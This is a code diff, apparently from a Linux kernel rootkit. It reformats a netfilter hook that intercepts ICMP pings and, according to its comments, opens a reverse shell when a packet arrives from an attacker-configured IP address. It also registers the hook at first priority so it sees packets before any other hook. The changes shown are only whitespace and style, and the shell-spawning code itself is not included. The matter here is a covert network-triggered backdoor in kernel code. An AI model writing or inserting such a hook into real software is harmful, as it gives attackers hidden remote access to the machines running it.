@@ -332,15 +332,16 @@ static void do_something_on_interval(unsigned long data) {
  * Net filter hook option for intercepting ICMP pings and
  * looking for reverse shell requests.
  **/
-unsigned int icmp_hook_func(void* priv, struct sk_buff *skb, const struct nf_hook_state *state) {
-	struct iphdr *ip_header;
+unsigned int icmp_hook_func(void* priv, struct sk_buff* skb, const struct nf_hook_state* state) {
+	struct iphdr* ip_header;
 
 	if (!skb) {
 		return NF_DROP;
 	}
 
 	// TODO: Maybe use icmp_hdr()
-	ip_header = (struct iphdr *) skb_network_header(skb);
+	ip_header = (struct iphdr*) skb_network_header(skb);
+
 	// If it's an ICMP packet coming from the IP address entered during config,
 	// we should open a reverse shell.
 	if (ip_header->protocol == IPPROTO_ICMP) {
@@ -360,13 +361,13 @@ static void icmp_hook_init(void) {
 	icmp_hook = kcalloc(1, sizeof(struct nf_hook_ops), GFP_KERNEL);
 
 	icmp_hook->hook = icmp_hook_func;
-    icmp_hook->pf = PF_INET; // Filter by IPV4 protocol family.
+	icmp_hook->pf = PF_INET; // Filter by IPV4 protocol family.
 	icmp_hook->hooknum = 0; // Hook ICMP request
 	icmp_hook->priority = NF_IP_PRI_FIRST; // See packets before every other hook function
 
-    if (nf_register_net_hook(&init_net, icmp_hook)) {
-    	printk(KERN_ERR "There was an issue registering ICMP hook.\n");
-    } else {
+	if (nf_register_net_hook(&init_net, icmp_hook)) {
+		printk(KERN_ERR "There was an issue registering ICMP hook.\n");
+	} else {
 		printk(KERN_ERR "Registered ICMP hook.\n");
 	}
 }
